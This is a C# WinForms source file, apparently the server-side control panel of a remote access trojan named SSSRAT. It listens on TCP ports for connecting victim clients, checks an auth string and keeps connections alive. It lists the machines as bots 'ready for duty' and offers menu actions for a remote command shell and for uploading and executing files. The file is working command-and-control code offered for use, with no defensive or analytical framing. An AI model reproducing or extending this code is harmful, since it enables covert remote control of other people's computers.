using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Public;

namespace SSSRAT_GUI {
	public partial class FrmMain : Form {
		public FrmMain() {
			InitializeComponent();
		}

		
		TcpListener listener;
		static uint idIncrement;
		static bool isListening;

		#region Threads
		void KeepAlive(object Client) {
			var client = (TcpClient)Client;
			while (client != null && client.Connected) {
				var readBuff = new byte[2];
				try {
					var stm = client.GetStream();
					stm.Write(_.GB("KA"), 0, 2);
					stm.Read(readBuff, 0, 2);
				} catch {
					RemoveClient(_.GetClientByIP(_.GetIPByRemoteEndPoint(client.Client.RemoteEndPoint)));
				}
				if (_.GS(readBuff) != "ON") {
					RemoveClient(_.GetClientByIP(_.GetIPByRemoteEndPoint(client.Client.RemoteEndPoint)));
				}
				ToLog("KA done for " + client.Client.RemoteEndPoint);
				Thread.Sleep(10000);
			}
			if (client != null)
				RemoveClient(_.GetClientByIP(_.GetIPByRemoteEndPoint(client.Client.RemoteEndPoint)));
		}

		void KAList() {
			var kaList = new TcpListener(IPAddress.Any, _.kaPort);
			kaList.Start();
			while (isListening) {
				try {
					TcpClient client = kaList.AcceptTcpClient();
					new Thread(KeepAlive).Start(client);
				} catch {
				}
			}
		}

		void ListenThread() {
			listener = new TcpListener(IPAddress.Any, _.port);
			listener.Start();
			while (isListening) {
				try {
					TcpClient client = listener.AcceptTcpClient();
					new Thread(ListenHandle).Start(client);
				} catch {
				}
			}
		}

		void ListenHandle(object Client) {
			var client = (TcpClient)Client;
			var stm = client.GetStream();
			_.Send(stm, _.GB("READY"));
			byte[] readBuff = _.Recv(stm, _.MAX_BUFFER);
			if (_.CleanOs(_.GS(readBuff)) != t_auth.Text) {
				string ip = client.Client.RemoteEndPoint.ToString();
				client.Close();
				ToLog("AUTH failed for " + ip + " GOT " + _.CleanOs(_.GS(readBuff)) + " EXPECTED " + t_auth.Text);
				return;
			}
			_.Send(stm, _.GB("S"));
			AddClient(client);
		}
		#endregion

		#region Funcs
		void AddClient(TcpClient client) {
			for (int x = 0; x < _.clients.Count; x++) {
				if (_.clients[x].tcp.Client.Equals(client.Client)) {
					return;
				}
			}
				var item = new ListViewItem("ID: " + ++idIncrement + ", IP: " + client.Client.RemoteEndPoint);
				var cl = new Client(idIncrement, client, item);
				_.clients.Add(cl);
				Invoke(new MethodInvoker(() => list_clients.Items.Add(item)));
				ToLog("ID " + cl.id + " (" + cl.tcp.Client.RemoteEndPoint + ") ready for duty!");
		}

		void RemoveClient(Client client) {
			Invoke(new MethodInvoker(() => list_clients.Items.Remove(client.lvi)));
			_.clients.Remove(client);
			ToLog("ID " + client.id + (client.tcp.Client.RemoteEndPoint != null ?
									   "(" + client.tcp.Client.RemoteEndPoint + ")"
									   : "") + " has deserted!");
		}

		Client GetClientByLVItem(ListViewItem item) {
			string text = item.Text;
			for (int x = 0; x < _.clients.Count; x++) {
				if (text == "ID: " + _.clients[x].id + ", IP: " + _.clients[x].tcp.Client.RemoteEndPoint) {
					return _.clients[x];
				}
			}
			return new Client(UInt32.MaxValue, new TcpClient(), new ListViewItem());
		}

		Client GetCurrentSelectedClient() {
			return GetClientByLVItem(list_clients.Items[list_clients.SelectedIndices[0]]);
		}

		static string delayLog = "";
		static void ToLog(string str) {
			string toWr = DateTime.Now.Hour + ":" + DateTime.Now.Minute + ":" + DateTime.Now.Second + "." +
			              DateTime.Now.Millisecond + "\t\t" + str + "\r\n";
			try {
				System.IO.File.AppendAllText(Application.StartupPath + "\\log.log", toWr);
			} catch {
				delayLog += toWr;
				new Thread(() => {
					while (true) {
						try {
							System.IO.File.AppendAllText(Application.StartupPath + "\\log.log", delayLog);
							delayLog = "";
							return;
						} catch { }
						Thread.Sleep(100);
					}
				}).Start();
			}
		}


		#endregion

		#region Forms
		void TPortEnter(object sender, EventArgs e) {
			if (t_port.Text == "" || t_port.Text == "Command port") {
				t_port.Text = String.Empty;
				t_port.ForeColor = Color.Black;
				t_port.Font = new Font(t_port.Font.FontFamily,
											 t_port.Font.Size,
											 FontStyle.Regular);
			}
		}

		void TPortLeave(object sender, EventArgs e) {
			if (t_port.Text == "") {
				t_port.Text = "Command port";
				t_port.ForeColor = Color.Gray;
				t_port.Font = new Font(t_port.Font.FontFamily,
											 t_port.Font.Size,
											 FontStyle.Italic);
			} else {
				try {
					if (Int32.Parse(t_port.Text) > 65535) {
						t_port.Text = "65535";
					}
					_.port = Int32.Parse(t_port.Text);
				} catch {
					t_port.Text = "13337";
				}
			}
		}

		void BStartListeningClick(object sender, EventArgs e) {
			isListening = true;
			l_listeningOn.Text = "Listening on: " + _.port;
			l_listeningOn.ForeColor = Color.Green;
			new Thread(ListenThread).Start();
			new Thread(KAList).Start();
		}

		private void BStopListeningClick(object sender, EventArgs e) {
			isListening = false;
			listener.Stop();
			l_listeningOn.Text = "Listening on: N/A";
			l_listeningOn.ForeColor = Color.Red;
		}

		private void TAuthEnter(object sender, EventArgs e) {
			if (t_auth.Text == "" || t_auth.Text == "Auth") {
				t_auth.Text = String.Empty;
				t_auth.ForeColor = Color.Black;
				t_auth.Font = new Font(t_auth.Font.FontFamily,
											 t_auth.Font.Size,
											 FontStyle.Regular);
			}
		}

		private void TAuthLeave(object sender, EventArgs e) {
			if (t_auth.Text == "") {
				t_auth.Text = "Auth";
				t_auth.ForeColor = Color.Gray;
				t_auth.Font = new Font(t_auth.Font.FontFamily,
											 t_auth.Font.Size,
											 FontStyle.Italic);
			}
		}

		private void TKaPortLeave(object sender, EventArgs e) {
			if (t_kaPort.Text == "") {
				t_kaPort.Text = "Keep-alive port";
				t_kaPort.ForeColor = Color.Gray;
				t_kaPort.Font = new Font(t_kaPort.Font.FontFamily,
											 t_kaPort.Font.Size,
											 FontStyle.Italic);
			} else {
				try {
					if (Int32.Parse(t_kaPort.Text) > 65535) {
						t_kaPort.Text = "65535";
					}
					_.kaPort = Int32.Parse(t_kaPort.Text);
				} catch {
					t_kaPort.Text = "13338";
				}
			}
		}

		private void TKaPortEnter(object sender, EventArgs e) {
			if (t_kaPort.Text == "" || t_kaPort.Text == "Keep-alive port") {
				t_kaPort.Text = String.Empty;
				t_kaPort.ForeColor = Color.Black;
				t_kaPort.Font = new Font(t_kaPort.Font.FontFamily,
											 t_kaPort.Font.Size,
											 FontStyle.Regular);
			}
		}

		private void ListClientsMouseClick(object sender, MouseEventArgs e) {
			if (e.Button == MouseButtons.Right) {
				if (list_clients.FocusedItem.Bounds.Contains(e.Location)) {
					Client selectedClient = GetClientByLVItem(list_clients.Items[list_clients.SelectedIndices[0]]);
					l_menu_id.Text = "ID: " + selectedClient.id;
					if (selectedClient.id == UInt32.MaxValue) {
						cMDToolStripMenuItem.Enabled = false;
						uplExecuteToolStripMenuItem.Enabled = false;
						infoToolStripMenuItem.Enabled = false;
						l_menu_id.Text = "ID: N/A";
					}
					cMDToolStripMenuItem.Enabled = true;
					uplExecuteToolStripMenuItem.Enabled = true;
					infoToolStripMenuItem.Enabled = true;
					menu_client.Show(Cursor.Position);
				}
			}
		}

		private void CMDToolStripMenuItemClick(object sender, EventArgs e) {
			var cmd = new FrmCMD();
			cmd.Init(GetCurrentSelectedClient());
			cmd.Show();
		}
		#endregion
	}
}
